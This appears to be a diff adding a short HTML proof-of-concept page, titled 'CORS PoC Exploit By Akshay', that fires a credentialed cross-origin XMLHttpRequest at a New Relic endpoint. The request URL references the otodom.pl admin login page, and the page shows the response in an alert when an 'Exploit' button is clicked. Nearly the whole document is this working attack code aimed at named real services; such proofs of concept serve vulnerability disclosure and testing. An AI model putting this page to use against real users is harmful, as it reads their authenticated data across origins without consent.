@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <script>
+         function cors() {
+	        var xhttp = new XMLHttpRequest();
+		        xhttp.onreadystatechange = function() {
+			        if (this.readyState == 4 && this.status == 200) {
+			        	document.getElementById("emo").innerHTML = alert(this.responseText);
+	        }
+         };
+         xhttp.open("GET", "https://bam.nr-data.net/1/8c376650ae?a=27726256&sa=1&v=1167.2a4546b&t=Unnamed%20Transaction&rst=19645&ref=https://www.otodom.pl/adminpanel/login/&be=18791&fe=19605&dc=19038&af=err,xhr,stn,ins&perf=%7B%22timing%22:%7B%22of%22:1618233562660,%22n%22:0,%22u%22:18094,%22ue%22:18099,%22f%22:1,%22dn%22:29,%22dne%22:30,%22c%22:30,%22s%22:0,%22ce%22:31,%22rq%22:32,%22rp%22:63,%22rpe%22:18076,%22dl%22:18093,%22di%22:18937,%22ds%22:19037,%22de%22:19047,%22dc%22:19603,%22l%22:19603,%22le%22:19605%7D,%22navigation%22:%7B%22ty%22:1%7D%7D&ja=%7B%22cdn_name%22:%22CF%22%7D&jsonp=NREUM.setToken", true);
+         xhttp.withCredentials = true;
+         xhttp.send();
+         }
+      </script>
+   </head>
+   <body>
+      <center>
+      <h2>CORS PoC Exploit By Akshay </h2>
+      <h3>created by <a href="https://twitter.com/AKSHAYC09YC47">@C09YC47</a></h3>
+      <h3>Show full content of page</h3>
+      <div id="demo">
+         <button type="button" onclick="cors()">Exploit</button>
+      </div>
+   </body>
+</html>
+
+	
